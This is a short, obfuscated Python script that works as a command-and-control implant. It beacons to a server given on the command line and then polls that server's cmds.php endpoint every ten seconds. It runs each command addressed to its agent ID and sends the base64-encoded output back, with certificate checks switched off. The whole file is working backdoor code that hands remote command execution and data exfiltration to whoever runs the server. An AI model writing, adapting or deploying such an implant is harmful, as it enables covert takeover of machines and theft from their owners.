V='&id='
U='/res.php?res='
J=False
I=str
F='ascii'
import requests as B,base64 as G,sys,time,subprocess as K
A=sys.argv[1]
C=sys.argv[2]
L='Hello From Agent '+A+' (Python)'
M=L.encode(F)
N=G.b64encode(M)
O=N.decode(F)
W=B.get(C+U+O+V+A,verify=J)
while True:
	D=B.get(C+'/cmds.php?id='+A+'&o=P',verify=J);D=I(D.text)
	for H in D.splitlines():
		if I(A)in H:P=I(H.split(':',1)[1]);Q=P.split(' ');E=K.check_output(Q);E=E.decode('utf-8');R=E.encode(F);S=G.b64encode(R);T=S.decode(F);X=B.get(C+U+T+V+A,verify=J)
	time.sleep(10)
